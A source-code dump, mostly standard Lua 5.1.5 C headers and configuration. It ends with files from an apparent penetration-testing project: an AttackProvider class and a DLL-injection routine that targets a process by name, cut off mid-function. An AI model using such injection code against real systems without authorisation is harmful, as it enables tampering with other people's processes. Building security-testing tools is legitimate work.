LUA_API void  (lua_rawseti) (lua_State *L, int idx, int n);
LUA_API int   (lua_setmetatable) (lua_State *L, int objindex);
LUA_API int   (lua_setfenv) (lua_State *L, int idx);


/*
** `load' and `call' functions (load and run Lua code)
*/
LUA_API void  (lua_call) (lua_State *L, int nargs, int nresults);
LUA_API int   (lua_pcall) (lua_State *L, int nargs, int nresults, int errfunc);
LUA_API int   (lua_cpcall) (lua_State *L, lua_CFunction func, void *ud);
LUA_API int   (lua_load) (lua_State *L, lua_Reader reader, void *dt,
                                        const char *chunkname);

LUA_API int (lua_dump) (lua_State *L, lua_Writer writer, void *data);


/*
** coroutine functions
*/
LUA_API int  (lua_yield) (lua_State *L, int nresults);
LUA_API int  (lua_resume) (lua_State *L, int narg);
LUA_API int  (lua_status) (lua_State *L);

/*
** garbage-collection function and options
*/

#define LUA_GCSTOP		0
#define LUA_GCRESTART		1
#define LUA_GCCOLLECT		2
#define LUA_GCCOUNT		3
#define LUA_GCCOUNTB		4
#define LUA_GCSTEP		5
#define LUA_GCSETPAUSE		6
#define LUA_GCSETSTEPMUL	7

LUA_API int (lua_gc) (lua_State *L, int what, int data);


/*
** miscellaneous functions
*/

LUA_API int   (lua_error) (lua_State *L);

LUA_API int   (lua_next) (lua_State *L, int idx);

LUA_API void  (lua_concat) (lua_State *L, int n);

LUA_API lua_Alloc (lua_getallocf) (lua_State *L, void **ud);
LUA_API void lua_setallocf (lua_State *L, lua_Alloc f, void *ud);



/* 
** ===============================================================
** some useful macros
** ===============================================================
*/

#define lua_pop(L,n)		lua_settop(L, -(n)-1)

#define lua_newtable(L)		lua_createtable(L, 0, 0)

#define lua_register(L,n,f) (lua_pushcfunction(L, (f)), lua_setglobal(L, (n)))

#define lua_pushcfunction(L,f)	lua_pushcclosure(L, (f), 0)

#define lua_strlen(L,i)		lua_objlen(L, (i))

#define lua_isfunction(L,n)	(lua_type(L, (n)) == LUA_TFUNCTION)
#define lua_istable(L,n)	(lua_type(L, (n)) == LUA_TTABLE)
#define lua_islightuserdata(L,n)	(lua_type(L, (n)) == LUA_TLIGHTUSERDATA)
#define lua_isnil(L,n)		(lua_type(L, (n)) == LUA_TNIL)
#define lua_isboolean(L,n)	(lua_type(L, (n)) == LUA_TBOOLEAN)
#define lua_isthread(L,n)	(lua_type(L, (n)) == LUA_TTHREAD)
#define lua_isnone(L,n)		(lua_type(L, (n)) == LUA_TNONE)
#define lua_isnoneornil(L, n)	(lua_type(L, (n)) <= 0)

#define lua_pushliteral(L, s)	\
	lua_pushlstring(L, "" s, (sizeof(s)/sizeof(char))-1)

#define lua_setglobal(L,s)	lua_setfield(L, LUA_GLOBALSINDEX, (s))
#define lua_getglobal(L,s)	lua_getfield(L, LUA_GLOBALSINDEX, (s))

#define lua_tostring(L,i)	lua_tolstring(L, (i), NULL)



/*
** compatibility macros and functions
*/

#define lua_open()	luaL_newstate()

#define lua_getregistry(L)	lua_pushvalue(L, LUA_REGISTRYINDEX)

#define lua_getgccount(L)	lua_gc(L, LUA_GCCOUNT, 0)

#define lua_Chunkreader		lua_Reader
#define lua_Chunkwriter		lua_Writer


/* hack */
LUA_API void lua_setlevel	(lua_State *from, lua_State *to);


/*
** {======================================================================
** Debug API
** =======================================================================
*/


/*
** Event codes
*/
#define LUA_HOOKCALL	0
#define LUA_HOOKRET	1
#define LUA_HOOKLINE	2
#define LUA_HOOKCOUNT	3
#define LUA_HOOKTAILRET 4


/*
** Event masks
*/
#define LUA_MASKCALL	(1 << LUA_HOOKCALL)
#define LUA_MASKRET	(1 << LUA_HOOKRET)
#define LUA_MASKLINE	(1 << LUA_HOOKLINE)
#define LUA_MASKCOUNT	(1 << LUA_HOOKCOUNT)

typedef struct lua_Debug lua_Debug;  /* activation record */


/* Functions to be called by the debuger in specific events */
typedef void (*lua_Hook) (lua_State *L, lua_Debug *ar);


LUA_API int lua_getstack (lua_State *L, int level, lua_Debug *ar);
LUA_API int lua_getinfo (lua_State *L, const char *what, lua_Debug *ar);
LUA_API const char *lua_getlocal (lua_State *L, const lua_Debug *ar, int n);
LUA_API const char *lua_setlocal (lua_State *L, const lua_Debug *ar, int n);
LUA_API const char *lua_getupvalue (lua_State *L, int funcindex, int n);
LUA_API const char *lua_setupvalue (lua_State *L, int funcindex, int n);

LUA_API int lua_sethook (lua_State *L, lua_Hook func, int mask, int count);
LUA_API lua_Hook lua_gethook (lua_State *L);
LUA_API int lua_gethookmask (lua_State *L);
LUA_API int lua_gethookcount (lua_State *L);


struct lua_Debug {
  int event;
  const char *name;	/* (n) */
  const char *namewhat;	/* (n) `global', `local', `field', `method' */
  const char *what;	/* (S) `Lua', `C', `main', `tail' */
  const char *source;	/* (S) */
  int currentline;	/* (l) */
  int nups;		/* (u) number of upvalues */
  int linedefined;	/* (S) */
  int lastlinedefined;	/* (S) */
  char short_src[LUA_IDSIZE]; /* (S) */
  /* private part */
  int i_ci;  /* active function */
};

/* }====================================================================== */


/******************************************************************************
* Copyright (C) 1994-2012 Lua.org, PUC-Rio.  All rights reserved.
*
* Permission is hereby granted, free of charge, to any person obtaining
* a copy of this software and associated documentation files (the
* "Software"), to deal in the Software without restriction, including
* without limitation the rights to use, copy, modify, merge, publish,
* distribute, sublicense, and/or sell copies of the Software, and to
* permit persons to whom the Software is furnished to do so, subject to
* the following conditions:
*
* The above copyright notice and this permission notice shall be
* included in all copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
* EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
* MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
* IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
* CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
* TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
* SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
******************************************************************************/


#endif

```

`LuaInterface/lua-5.1.5_Win64/include/lua.hpp`:

```hpp
// lua.hpp
// Lua header files for C++
// <<extern "C">> not supplied automatically because Lua also compiles as C++

extern "C" {
#include "lua.h"
#include "lualib.h"
#include "lauxlib.h"
}

```

`LuaInterface/lua-5.1.5_Win64/include/luaconf.h`:

```h
/*
** $Id: luaconf.h,v 1.82.1.7 2008/02/11 16:25:08 roberto Exp $
** Configuration file for Lua
** See Copyright Notice in lua.h
*/


#ifndef lconfig_h
#define lconfig_h

#include <limits.h>
#include <stddef.h>


/*
** ==================================================================
** Search for "@@" to find all configurable definitions.
** ===================================================================
*/


/*
@@ LUA_ANSI controls the use of non-ansi features.
** CHANGE it (define it) if you want Lua to avoid the use of any
** non-ansi feature or library.
*/
#if defined(__STRICT_ANSI__)
#define LUA_ANSI
#endif


#if !defined(LUA_ANSI) && defined(_WIN32)
#define LUA_WIN
#endif

#if defined(LUA_USE_LINUX)
#define LUA_USE_POSIX
#define LUA_USE_DLOPEN		/* needs an extra library: -ldl */
#define LUA_USE_READLINE	/* needs some extra libraries */
#endif

#if defined(LUA_USE_MACOSX)
#define LUA_USE_POSIX
#define LUA_DL_DYLD		/* does not need extra library */
#endif



/*
@@ LUA_USE_POSIX includes all functionallity listed as X/Open System
@* Interfaces Extension (XSI).
** CHANGE it (define it) if your system is XSI compatible.
*/
#if defined(LUA_USE_POSIX)
#define LUA_USE_MKSTEMP
#define LUA_USE_ISATTY
#define LUA_USE_POPEN
#define LUA_USE_ULONGJMP
#endif


/*
@@ LUA_PATH and LUA_CPATH are the names of the environment variables that
@* Lua check to set its paths.
@@ LUA_INIT is the name of the environment variable that Lua
@* checks for initialization code.
** CHANGE them if you want different names.
*/
#define LUA_PATH        "LUA_PATH"
#define LUA_CPATH       "LUA_CPATH"
#define LUA_INIT	"LUA_INIT"


/*
@@ LUA_PATH_DEFAULT is the default path that Lua uses to look for
@* Lua libraries.
@@ LUA_CPATH_DEFAULT is the default path that Lua uses to look for
@* C libraries.
** CHANGE them if your machine has a non-conventional directory
** hierarchy or if you want to install your libraries in
** non-conventional directories.
*/
#if defined(_WIN32)
/*
** In Windows, any exclamation mark ('!') in the path is replaced by the
** path of the directory of the executable file of the current process.
*/
#define LUA_LDIR	"!\\lua\\"
#define LUA_CDIR	"!\\"
#define LUA_PATH_DEFAULT  \
		".\\?.lua;"  LUA_LDIR"?.lua;"  LUA_LDIR"?\\init.lua;" \
		             LUA_CDIR"?.lua;"  LUA_CDIR"?\\init.lua"
#define LUA_CPATH_DEFAULT \
		".\\?.dll;"  LUA_CDIR"?.dll;" LUA_CDIR"loadall.dll;" \
		LUA_CDIR"clibs\\?.dll;" LUA_CDIR"clibs\\loadall.dll;" \
		".\\?51.dll;"  LUA_CDIR"?51.dll;" LUA_CDIR"clibs\\?51.dll" 

#else
#define LUA_ROOT	"/usr/local/"
#define LUA_LDIR	LUA_ROOT "share/lua/5.1/"
#define LUA_CDIR	LUA_ROOT "lib/lua/5.1/"
#define LUA_PATH_DEFAULT  \
		"./?.lua;"  LUA_LDIR"?.lua;"  LUA_LDIR"?/init.lua;" \
		            LUA_CDIR"?.lua;"  LUA_CDIR"?/init.lua"
#define LUA_CPATH_DEFAULT \
		"./?.so;"  LUA_CDIR"?.so;" LUA_CDIR"loadall.so;" \
		"./lib?51.so;" LUA_CDIR"lib?51.so"
#endif


/*
@@ LUA_DIRSEP is the directory separator (for submodules).
** CHANGE it if your machine does not use "/" as the directory separator
** and is not Windows. (On Windows Lua automatically uses "\".)
*/
#if defined(_WIN32)
#define LUA_DIRSEP	"\\"
#else
#define LUA_DIRSEP	"/"
#endif


/*
@@ LUA_PATHSEP is the character that separates templates in a path.
@@ LUA_PATH_MARK is the string that marks the substitution points in a
@* template.
@@ LUA_EXECDIR in a Windows path is replaced by the executable's
@* directory.
@@ LUA_IGMARK is a mark to ignore all before it when bulding the
@* luaopen_ function name.
** CHANGE them if for some reason your system cannot use those
** characters. (E.g., if one of those characters is a common character
** in file/directory names.) Probably you do not need to change them.
*/
#define LUA_PATHSEP	";"
#define LUA_PATH_MARK	"?"
#define LUA_EXECDIR	"!"
#define LUA_IGMARK	"-"


/*
@@ LUA_INTEGER is the integral type used by lua_pushinteger/lua_tointeger.
** CHANGE that if ptrdiff_t is not adequate on your machine. (On most
** machines, ptrdiff_t gives a good choice between int or long.)
*/
#define LUA_INTEGER	ptrdiff_t


/*
@@ LUA_API is a mark for all core API functions.
@@ LUALIB_API is a mark for all standard library functions.
** CHANGE them if you need to define those functions in some special way.
** For instance, if you want to create one Windows DLL with the core and
** the libraries, you may want to use the following definition (define
** LUA_BUILD_AS_DLL to get it).
*/
#if defined(LUA_BUILD_AS_DLL)

#if defined(LUA_CORE) || defined(LUA_LIB)
#define LUA_API __declspec(dllexport)
#else
#define LUA_API __declspec(dllimport)
#endif

#else

#define LUA_API		extern

#endif

/* more often than not the libs go together with the core */
#define LUALIB_API	LUA_API


/*
@@ LUAI_FUNC is a mark for all extern functions that are not to be
@* exported to outside modules.
@@ LUAI_DATA is a mark for all extern (const) variables that are not to
@* be exported to outside modules.
** CHANGE them if you need to mark them in some special way. Elf/gcc
** (versions 3.2 and later) mark them as "hidden" to optimize access
** when Lua is compiled as a shared library.
*/
#if defined(luaall_c)
#define LUAI_FUNC	static
#define LUAI_DATA	/* empty */

#elif defined(__GNUC__) && ((__GNUC__*100 + __GNUC_MINOR__) >= 302) && \
      defined(__ELF__)
#define LUAI_FUNC	__attribute__((visibility("hidden"))) extern
#define LUAI_DATA	LUAI_FUNC

#else
#define LUAI_FUNC	extern
#define LUAI_DATA	extern
#endif



/*
@@ LUA_QL describes how error messages quote program elements.
** CHANGE it if you want a different appearance.
*/
#define LUA_QL(x)	"'" x "'"
#define LUA_QS		LUA_QL("%s")


/*
@@ LUA_IDSIZE gives the maximum size for the description of the source
@* of a function in debug information.
** CHANGE it if you want a different size.
*/
#define LUA_IDSIZE	60


/*
** {==================================================================
** Stand-alone configuration
** ===================================================================
*/

#if defined(lua_c) || defined(luaall_c)

/*
@@ lua_stdin_is_tty detects whether the standard input is a 'tty' (that
@* is, whether we're running lua interactively).
** CHANGE it if you have a better definition for non-POSIX/non-Windows
** systems.
*/
#if defined(LUA_USE_ISATTY)
#include <unistd.h>
#define lua_stdin_is_tty()	isatty(0)
#elif defined(LUA_WIN)
#include <io.h>
#include <stdio.h>
#define lua_stdin_is_tty()	_isatty(_fileno(stdin))
#else
#define lua_stdin_is_tty()	1  /* assume stdin is a tty */
#endif


/*
@@ LUA_PROMPT is the default prompt used by stand-alone Lua.
@@ LUA_PROMPT2 is the default continuation prompt used by stand-alone Lua.
** CHANGE them if you want different prompts. (You can also change the
** prompts dynamically, assigning to globals _PROMPT/_PROMPT2.)
*/
#define LUA_PROMPT		"> "
#define LUA_PROMPT2		">> "


/*
@@ LUA_PROGNAME is the default name for the stand-alone Lua program.
** CHANGE it if your stand-alone interpreter has a different name and
** your system is not able to detect that name automatically.
*/
#define LUA_PROGNAME		"lua"


/*
@@ LUA_MAXINPUT is the maximum length for an input line in the
@* stand-alone interpreter.
** CHANGE it if you need longer lines.
*/
#define LUA_MAXINPUT	512


/*
@@ lua_readline defines how to show a prompt and then read a line from
@* the standard input.
@@ lua_saveline defines how to "save" a read line in a "history".
@@ lua_freeline defines how to free a line read by lua_readline.
** CHANGE them if you want to improve this functionality (e.g., by using
** GNU readline and history facilities).
*/
#if defined(LUA_USE_READLINE)
#include <stdio.h>
#include <readline/readline.h>
#include <readline/history.h>
#define lua_readline(L,b,p)	((void)L, ((b)=readline(p)) != NULL)
#define lua_saveline(L,idx) \
	if (lua_strlen(L,idx) > 0)  /* non-empty line? */ \
	  add_history(lua_tostring(L, idx));  /* add it to history */
#define lua_freeline(L,b)	((void)L, free(b))
#else
#define lua_readline(L,b,p)	\
	((void)L, fputs(p, stdout), fflush(stdout),  /* show prompt */ \
	fgets(b, LUA_MAXINPUT, stdin) != NULL)  /* get line */
#define lua_saveline(L,idx)	{ (void)L; (void)idx; }
#define lua_freeline(L,b)	{ (void)L; (void)b; }
#endif

#endif

/* }================================================================== */


/*
@@ LUAI_GCPAUSE defines the default pause between garbage-collector cycles
@* as a percentage.
** CHANGE it if you want the GC to run faster or slower (higher values
** mean larger pauses which mean slower collection.) You can also change
** this value dynamically.
*/
#define LUAI_GCPAUSE	200  /* 200% (wait memory to double before next GC) */


/*
@@ LUAI_GCMUL defines the default speed of garbage collection relative to
@* memory allocation as a percentage.
** CHANGE it if you want to change the granularity of the garbage
** collection. (Higher values mean coarser collections. 0 represents
** infinity, where each step performs a full collection.) You can also
** change this value dynamically.
*/
#define LUAI_GCMUL	200 /* GC runs 'twice the speed' of memory allocation */



/*
@@ LUA_COMPAT_GETN controls compatibility with old getn behavior.
** CHANGE it (define it) if you want exact compatibility with the
** behavior of setn/getn in Lua 5.0.
*/
#undef LUA_COMPAT_GETN

/*
@@ LUA_COMPAT_LOADLIB controls compatibility about global loadlib.
** CHANGE it to undefined as soon as you do not need a global 'loadlib'
** function (the function is still available as 'package.loadlib').
*/
#undef LUA_COMPAT_LOADLIB

/*
@@ LUA_COMPAT_VARARG controls compatibility with old vararg feature.
** CHANGE it to undefined as soon as your programs use only '...' to
** access vararg parameters (instead of the old 'arg' table).
*/
#define LUA_COMPAT_VARARG

/*
@@ LUA_COMPAT_MOD controls compatibility with old math.mod function.
** CHANGE it to undefined as soon as your programs use 'math.fmod' or
** the new '%' operator instead of 'math.mod'.
*/
#define LUA_COMPAT_MOD

/*
@@ LUA_COMPAT_LSTR controls compatibility with old long string nesting
@* facility.
** CHANGE it to 2 if you want the old behaviour, or undefine it to turn
** off the advisory error when nesting [[...]].
*/
#define LUA_COMPAT_LSTR		1

/*
@@ LUA_COMPAT_GFIND controls compatibility with old 'string.gfind' name.
** CHANGE it to undefined as soon as you rename 'string.gfind' to
** 'string.gmatch'.
*/
#define LUA_COMPAT_GFIND

/*
@@ LUA_COMPAT_OPENLIB controls compatibility with old 'luaL_openlib'
@* behavior.
** CHANGE it to undefined as soon as you replace to 'luaL_register'
** your uses of 'luaL_openlib'
*/
#define LUA_COMPAT_OPENLIB



/*
@@ luai_apicheck is the assert macro used by the Lua-C API.
** CHANGE luai_apicheck if you want Lua to perform some checks in the
** parameters it gets from API calls. This may slow down the interpreter
** a bit, but may be quite useful when debugging C code that interfaces
** with Lua. A useful redefinition is to use assert.h.
*/
#if defined(LUA_USE_APICHECK)
#include <assert.h>
#define luai_apicheck(L,o)	{ (void)L; assert(o); }
#else
#define luai_apicheck(L,o)	{ (void)L; }
#endif


/*
@@ LUAI_BITSINT defines the number of bits in an int.
** CHANGE here if Lua cannot automatically detect the number of bits of
** your machine. Probably you do not need to change this.
*/
/* avoid overflows in comparison */
#if INT_MAX-20 < 32760
#define LUAI_BITSINT	16
#elif INT_MAX > 2147483640L
/* int has at least 32 bits */
#define LUAI_BITSINT	32
#else
#error "you must define LUA_BITSINT with number of bits in an integer"
#endif


/*
@@ LUAI_UINT32 is an unsigned integer with at least 32 bits.
@@ LUAI_INT32 is an signed integer with at least 32 bits.
@@ LUAI_UMEM is an unsigned integer big enough to count the total
@* memory used by Lua.
@@ LUAI_MEM is a signed integer big enough to count the total memory
@* used by Lua.
** CHANGE here if for some weird reason the default definitions are not
** good enough for your machine. (The definitions in the 'else'
** part always works, but may waste space on machines with 64-bit
** longs.) Probably you do not need to change this.
*/
#if LUAI_BITSINT >= 32
#define LUAI_UINT32	unsigned int
#define LUAI_INT32	int
#define LUAI_MAXINT32	INT_MAX
#define LUAI_UMEM	size_t
#define LUAI_MEM	ptrdiff_t
#else
/* 16-bit ints */
#define LUAI_UINT32	unsigned long
#define LUAI_INT32	long
#define LUAI_MAXINT32	LONG_MAX
#define LUAI_UMEM	unsigned long
#define LUAI_MEM	long
#endif


/*
@@ LUAI_MAXCALLS limits the number of nested calls.
** CHANGE it if you need really deep recursive calls. This limit is
** arbitrary; its only purpose is to stop infinite recursion before
** exhausting memory.
*/
#define LUAI_MAXCALLS	20000


/*
@@ LUAI_MAXCSTACK limits the number of Lua stack slots that a C function
@* can use.
** CHANGE it if you need lots of (Lua) stack space for your C
** functions. This limit is arbitrary; its only purpose is to stop C
** functions to consume unlimited stack space. (must be smaller than
** -LUA_REGISTRYINDEX)
*/
#define LUAI_MAXCSTACK	8000



/*
** {==================================================================
** CHANGE (to smaller values) the following definitions if your system
** has a small C stack. (Or you may want to change them to larger
** values if your system has a large C stack and these limits are
** too rigid for you.) Some of these constants control the size of
** stack-allocated arrays used by the compiler or the interpreter, while
** others limit the maximum number of recursive calls that the compiler
** or the interpreter can perform. Values too large may cause a C stack
** overflow for some forms of deep constructs.
** ===================================================================
*/


/*
@@ LUAI_MAXCCALLS is the maximum depth for nested C calls (short) and
@* syntactical nested non-terminals in a program.
*/
#define LUAI_MAXCCALLS		200


/*
@@ LUAI_MAXVARS is the maximum number of local variables per function
@* (must be smaller than 250).
*/
#define LUAI_MAXVARS		200


/*
@@ LUAI_MAXUPVALUES is the maximum number of upvalues per function
@* (must be smaller than 250).
*/
#define LUAI_MAXUPVALUES	60


/*
@@ LUAL_BUFFERSIZE is the buffer size used by the lauxlib buffer system.
*/
#define LUAL_BUFFERSIZE		BUFSIZ

/* }================================================================== */




/*
** {==================================================================
@@ LUA_NUMBER is the type of numbers in Lua.
** CHANGE the following definitions only if you want to build Lua
** with a number type different from double. You may also need to
** change lua_number2int & lua_number2integer.
** ===================================================================
*/

#define LUA_NUMBER_DOUBLE
#define LUA_NUMBER	double

/*
@@ LUAI_UACNUMBER is the result of an 'usual argument conversion'
@* over a number.
*/
#define LUAI_UACNUMBER	double


/*
@@ LUA_NUMBER_SCAN is the format for reading numbers.
@@ LUA_NUMBER_FMT is the format for writing numbers.
@@ lua_number2str converts a number to a string.
@@ LUAI_MAXNUMBER2STR is maximum size of previous conversion.
@@ lua_str2number converts a string to a number.
*/
#define LUA_NUMBER_SCAN		"%lf"
#define LUA_NUMBER_FMT		"%.14g"
#define lua_number2str(s,n)	sprintf((s), LUA_NUMBER_FMT, (n))
#define LUAI_MAXNUMBER2STR	32 /* 16 digits, sign, point, and \0 */
#define lua_str2number(s,p)	strtod((s), (p))


/*
@@ The luai_num* macros define the primitive operations over numbers.
*/
#if defined(LUA_CORE)
#include <math.h>
#define luai_numadd(a,b)	((a)+(b))
#define luai_numsub(a,b)	((a)-(b))
#define luai_nummul(a,b)	((a)*(b))
#define luai_numdiv(a,b)	((a)/(b))
#define luai_nummod(a,b)	((a) - floor((a)/(b))*(b))
#define luai_numpow(a,b)	(pow(a,b))
#define luai_numunm(a)		(-(a))
#define luai_numeq(a,b)		((a)==(b))
#define luai_numlt(a,b)		((a)<(b))
#define luai_numle(a,b)		((a)<=(b))
#define luai_numisnan(a)	(!luai_numeq((a), (a)))
#endif


/*
@@ lua_number2int is a macro to convert lua_Number to int.
@@ lua_number2integer is a macro to convert lua_Number to lua_Integer.
** CHANGE them if you know a faster way to convert a lua_Number to
** int (with any rounding method and without throwing errors) in your
** system. In Pentium machines, a naive typecast from double to int
** in C is extremely slow, so any alternative is worth trying.
*/

/* On a Pentium, resort to a trick */
#if defined(LUA_NUMBER_DOUBLE) && !defined(LUA_ANSI) && !defined(__SSE2__) && \
    (defined(__i386) || defined (_M_IX86) || defined(__i386__))

/* On a Microsoft compiler, use assembler */
#if defined(_MSC_VER)

#define lua_number2int(i,d)   __asm fld d   __asm fistp i
#define lua_number2integer(i,n)		lua_number2int(i, n)

/* the next trick should work on any Pentium, but sometimes clashes
   with a DirectX idiosyncrasy */
#else

union luai_Cast { double l_d; long l_l; };
#define lua_number2int(i,d) \
  { volatile union luai_Cast u; u.l_d = (d) + 6755399441055744.0; (i) = u.l_l; }
#define lua_number2integer(i,n)		lua_number2int(i, n)

#endif


/* this option always works, but may be slow */
#else
#define lua_number2int(i,d)	((i)=(int)(d))
#define lua_number2integer(i,d)	((i)=(lua_Integer)(d))

#endif

/* }================================================================== */


/*
@@ LUAI_USER_ALIGNMENT_T is a type that requires maximum alignment.
** CHANGE it if your system requires alignments larger than double. (For
** instance, if your system supports long doubles and they must be
** aligned in 16-byte boundaries, then you should add long double in the
** union.) Probably you do not need to change this.
*/
#define LUAI_USER_ALIGNMENT_T	union { double u; void *s; long l; }


/*
@@ LUAI_THROW/LUAI_TRY define how Lua does exception handling.
** CHANGE them if you prefer to use longjmp/setjmp even with C++
** or if want/don't to use _longjmp/_setjmp instead of regular
** longjmp/setjmp. By default, Lua handles errors with exceptions when
** compiling as C++ code, with _longjmp/_setjmp when asked to use them,
** and with longjmp/setjmp otherwise.
*/
#if defined(__cplusplus)
/* C++ exceptions */
#define LUAI_THROW(L,c)	throw(c)
#define LUAI_TRY(L,c,a)	try { a } catch(...) \
	{ if ((c)->status == 0) (c)->status = -1; }
#define luai_jmpbuf	int  /* dummy variable */

#elif defined(LUA_USE_ULONGJMP)
/* in Unix, try _longjmp/_setjmp (more efficient) */
#define LUAI_THROW(L,c)	_longjmp((c)->b, 1)
#define LUAI_TRY(L,c,a)	if (_setjmp((c)->b) == 0) { a }
#define luai_jmpbuf	jmp_buf

#else
/* default handling with long jumps */
#define LUAI_THROW(L,c)	longjmp((c)->b, 1)
#define LUAI_TRY(L,c,a)	if (setjmp((c)->b) == 0) { a }
#define luai_jmpbuf	jmp_buf

#endif


/*
@@ LUA_MAXCAPTURES is the maximum number of captures that a pattern
@* can do during pattern-matching.
** CHANGE it if you need more captures. This limit is arbitrary.
*/
#define LUA_MAXCAPTURES		32


/*
@@ lua_tmpnam is the function that the OS library uses to create a
@* temporary name.
@@ LUA_TMPNAMBUFSIZE is the maximum size of a name created by lua_tmpnam.
** CHANGE them if you have an alternative to tmpnam (which is considered
** insecure) or if you want the original tmpnam anyway.  By default, Lua
** uses tmpnam except when POSIX is available, where it uses mkstemp.
*/
#if defined(loslib_c) || defined(luaall_c)

#if defined(LUA_USE_MKSTEMP)
#include <unistd.h>
#define LUA_TMPNAMBUFSIZE	32
#define lua_tmpnam(b,e)	{ \
	strcpy(b, "/tmp/lua_XXXXXX"); \
	e = mkstemp(b); \
	if (e != -1) close(e); \
	e = (e == -1); }

#else
#define LUA_TMPNAMBUFSIZE	L_tmpnam
#define lua_tmpnam(b,e)		{ e = (tmpnam(b) == NULL); }
#endif

#endif


/*
@@ lua_popen spawns a new process connected to the current one through
@* the file streams.
** CHANGE it if you have a way to implement it in your system.
*/
#if defined(LUA_USE_POPEN)

#define lua_popen(L,c,m)	((void)L, fflush(NULL), popen(c,m))
#define lua_pclose(L,file)	((void)L, (pclose(file) != -1))

#elif defined(LUA_WIN)

#define lua_popen(L,c,m)	((void)L, _popen(c,m))
#define lua_pclose(L,file)	((void)L, (_pclose(file) != -1))

#else

#define lua_popen(L,c,m)	((void)((void)c, m),  \
		luaL_error(L, LUA_QL("popen") " not supported"), (FILE*)0)
#define lua_pclose(L,file)		((void)((void)L, file), 0)

#endif

/*
@@ LUA_DL_* define which dynamic-library system Lua should use.
** CHANGE here if Lua has problems choosing the appropriate
** dynamic-library system for your platform (either Windows' DLL, Mac's
** dyld, or Unix's dlopen). If your system is some kind of Unix, there
** is a good chance that it has dlopen, so LUA_DL_DLOPEN will work for
** it.  To use dlopen you also need to adapt the src/Makefile (probably
** adding -ldl to the linker options), so Lua does not select it
** automatically.  (When you change the makefile to add -ldl, you must
** also add -DLUA_USE_DLOPEN.)
** If you do not want any kind of dynamic library, undefine all these
** options.
** By default, _WIN32 gets LUA_DL_DLL and MAC OS X gets LUA_DL_DYLD.
*/
#if defined(LUA_USE_DLOPEN)
#define LUA_DL_DLOPEN
#endif

#if defined(LUA_WIN)
#define LUA_DL_DLL
#endif


/*
@@ LUAI_EXTRASPACE allows you to add user-specific data in a lua_State
@* (the data goes just *before* the lua_State pointer).
** CHANGE (define) this if you really need that. This value must be
** a multiple of the maximum alignment required for your machine.
*/
#define LUAI_EXTRASPACE		0


/*
@@ luai_userstate* allow user-specific actions on threads.
** CHANGE them if you defined LUAI_EXTRASPACE and need to do something
** extra when a thread is created/deleted/resumed/yielded.
*/
#define luai_userstateopen(L)		((void)L)
#define luai_userstateclose(L)		((void)L)
#define luai_userstatethread(L,L1)	((void)L)
#define luai_userstatefree(L)		((void)L)
#define luai_userstateresume(L,n)	((void)L)
#define luai_userstateyield(L,n)	((void)L)


/*
@@ LUA_INTFRMLEN is the length modifier for integer conversions
@* in 'string.format'.
@@ LUA_INTFRM_T is the integer type correspoding to the previous length
@* modifier.
** CHANGE them if your system supports long long or does not support long.
*/

#if defined(LUA_USELONGLONG)

#define LUA_INTFRMLEN		"ll"
#define LUA_INTFRM_T		long long

#else

#define LUA_INTFRMLEN		"l"
#define LUA_INTFRM_T		long

#endif



/* =================================================================== */

/*
** Local configuration. You can use this space to add your redefinitions
** without modifying the main part of the file.
*/



#endif


```

`LuaInterface/lua-5.1.5_Win64/include/lualib.h`:

```h
/*
** $Id: lualib.h,v 1.36.1.1 2007/12/27 13:02:25 roberto Exp $
** Lua standard libraries
** See Copyright Notice in lua.h
*/


#ifndef lualib_h
#define lualib_h

#include "lua.h"


/* Key to file-handle type */
#define LUA_FILEHANDLE		"FILE*"


#define LUA_COLIBNAME	"coroutine"
LUALIB_API int (luaopen_base) (lua_State *L);

#define LUA_TABLIBNAME	"table"
LUALIB_API int (luaopen_table) (lua_State *L);

#define LUA_IOLIBNAME	"io"
LUALIB_API int (luaopen_io) (lua_State *L);

#define LUA_OSLIBNAME	"os"
LUALIB_API int (luaopen_os) (lua_State *L);

#define LUA_STRLIBNAME	"string"
LUALIB_API int (luaopen_string) (lua_State *L);

#define LUA_MATHLIBNAME	"math"
LUALIB_API int (luaopen_math) (lua_State *L);

#define LUA_DBLIBNAME	"debug"
LUALIB_API int (luaopen_debug) (lua_State *L);

#define LUA_LOADLIBNAME	"package"
LUALIB_API int (luaopen_package) (lua_State *L);


/* open all previous libraries */
LUALIB_API void (luaL_openlibs) (lua_State *L); 



#ifndef lua_assert
#define lua_assert(x)	((void)0)
#endif


#endif

```

`PenetrationRoutines/AttackProvider/AttackProvider.h`:

```h
#pragma once;
#include <windows.h>
#include <string>

using namespace std;

class AttackProvider {
public:
    AttackProvider(){}
    string GetAttackResults() {
        return results;
    };
protected:
    string results = "";
};
```

`PenetrationRoutines/DLLInjectionProvider/DLLInjectionProvider.cpp`:

```cpp
#include <iostream>
#include <Shlwapi.h>
#include "DLLInjectionProvider.h"

bool DLLInjectionProvider::SetTargetProcessByName(const string _name) {
    this->processName = _name;
    wstring name(_name.begin(), _name.end());
    hProcess = GetProcessHandleByName(name);
    if (hProcess == NULL) {
        results += "[-] SetTargetProcessByName() failed. Could not get HANDLE to ";
        results += this->processName;
        results += ". System Error Code: ";
        results += to_string(GetLastError());
        results += "\n";
        return FALSE;
    }
    return TRUE;
}

bool DLLInjectionProvider::SetTargetDLL(const string _dllPath) {
    wstring dllPath(_dllPath.begin(), _dllPath.end());
    if (!PathFileExistsW(dllPath.c_str())) {
        results += "[-] SetTargetDLL() failed. File not found. System Error Code: ";
        results += to_string(GetLastError());
        results += "\n";
        return FALSE;
    }
    this->dllPath = dllPath;
    return TRUE;
}

bool DLLInjectionProvider::InjectDLL() {
    DeleteConfirmationFile(); // make sure there is no old confirmation file
    if (this->dllPath == L"" || this->hProcess == NULL) {
        results += "[-] InjectDLL() failed. Could not inject DLL. DLL or process is invalid.\n";
        return FALSE;
    }
    DWORD status;
    if (this->timeout <= 0) {
        if (!requireConfirmationFile) {
            status = LoadDll(hProcess, dllPath.c_str());
        } else {
            status = LoadDllNoShellcode(hProcess, dllPath.c_str());
